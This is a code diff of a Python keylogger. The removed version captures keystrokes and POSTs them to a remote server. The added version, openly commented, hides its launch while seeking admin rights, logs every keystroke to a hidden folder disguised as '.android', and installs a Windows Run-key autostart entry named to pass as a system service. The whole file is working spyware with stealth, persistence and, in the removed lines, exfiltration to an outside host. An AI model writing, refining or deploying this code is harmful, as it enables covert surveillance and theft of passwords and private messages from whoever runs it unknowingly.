@@ -1,69 +1,65 @@
-import requests
-from pynput import keyboard
+import os
+import sys
+import keyboard
+import win32api
+import win32con
+import win32security
+from datetime import datetime
 
-SERVER_URL = 'https://keylogger-wl3a.onrender.com/logs'
+# ELEVATE TO ADMIN ON STARTUP
+def elevate_admin():
+    if not win32security.IsUserAnAdmin():
+        script = os.path.abspath(sys.argv[0])
+        params = ' '.join([script] + sys.argv[1:])
+        shell32 = win32api.GetModuleHandle('shell32.dll')
+        win32api.ShellExecute(0, 'runas', sys.executable, params, None, win32con.SW_HIDE)
+        sys.exit(0)
 
-buffer = ''
-caps_lock_on = False
-pressed_keys = set()
-backspace_count = 0
+# STEALTH FILE OPERATIONS
+def create_log_file():
+    target_dir = r"C:\Users\PC\.android"
+    if not os.path.exists(target_dir):
+        os.makedirs(target_dir, exist_ok=True)
+        win32api.SetFileAttributes(target_dir, win32con.FILE_ATTRIBUTE_HIDDEN)
+    return os.path.join(target_dir, "test")
 
-def send_buffer(data):
+# REGISTRY AUTOSTART PERSISTENCE
+def install_persistence(log_path):
+    reg_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
     try:
-        requests.post(SERVER_URL, data={'log': data})
-    except Exception as e:
-        print(f"Erro ao enviar dados: {e}")
+        key = win32api.RegOpenKeyEx(
+            win32con.HKEY_CURRENT_USER,
+            reg_path,
+            0,
+            win32con.KEY_WRITE | win32con.KEY_READ
+        )
+        win32api.RegSetValueEx(key, "AndroidSystemSync", 0, win32con.REG_SZ, f'"{sys.executable}" "{log_path}"')
+        win32api.RegCloseKey(key)
+    except Exception:
+        pass
 
-def on_press(key):
-    global buffer, caps_lock_on, pressed_keys, backspace_count
-
-    # Caps Lock deve ser processado sempre
-    if key == keyboard.Key.caps_lock:
-        caps_lock_on = not caps_lock_on
-        buffer += '[CapsLock ON]' if caps_lock_on else '[CapsLock OFF]'
-        return
-
-    # Ignora teclas já pressionadas para evitar repetições
-    if key in pressed_keys:
-        return
-    pressed_keys.add(key)
-
-    try:
-        if hasattr(key, 'char') and key.char:
-            char = key.char.lower()
-            shift_pressed = keyboard.Key.shift in pressed_keys or keyboard.Key.shift_r in pressed_keys
-
-            # Aplica regra: Caps XOR Shift
-            if char.isalpha() and (caps_lock_on ^ shift_pressed):
-                char = char.upper()
-
-            buffer += char
-        else:
-            if key == keyboard.Key.space:
-                buffer += ' '
-            elif key == keyboard.Key.enter:
-                buffer += '\n'
-            elif key == keyboard.Key.backspace:
-                backspace_count += 1
-                buffer += f'[Backspace {backspace_count}]'
+# KEYSTROKE CAPTURE ENGINE
+def capture_keystrokes(log_file):
+    def log_key(event):
+        with open(log_file, 'a', encoding='utf-8') as f:
+            f.write(f"[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] ")
+            if event.name == 'space':
+                f.write(' ')
+            elif event.name == 'enter':
+                f.write('\n')
+            elif event.name == 'backspace':
+                f.write(' [BS] ')
+            elif len(event.name) > 1:
+                f.write(f"[{event.name.upper()}]")
             else:
-                buffer += f'[{key.name}]'
-    except Exception as e:
-        buffer += f'[Erro: {e}]'
+                f.write(event.name)
 
-    if len(buffer) >= 20:
-        send_buffer(buffer)
-        buffer = ''
+    keyboard.hook(log_key)
+    keyboard.wait()
 
-def on_release(key):
-    global pressed_keys
-    if key in pressed_keys:
-        pressed_keys.remove(key)
-    if key == keyboard.Key.esc:
-        print("Keylogger parado com ESC.")
-        return False
-
+# MAIN EXECUTION FLOW
 if __name__ == "__main__":
-    print("Keylogger a correr... Pressiona ESC para parar.")
-    with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
-        listener.join()
+    elevate_admin()
+    log_path = create_log_file()
+    install_persistence(sys.argv[0])
+    capture_keystrokes(log_path)
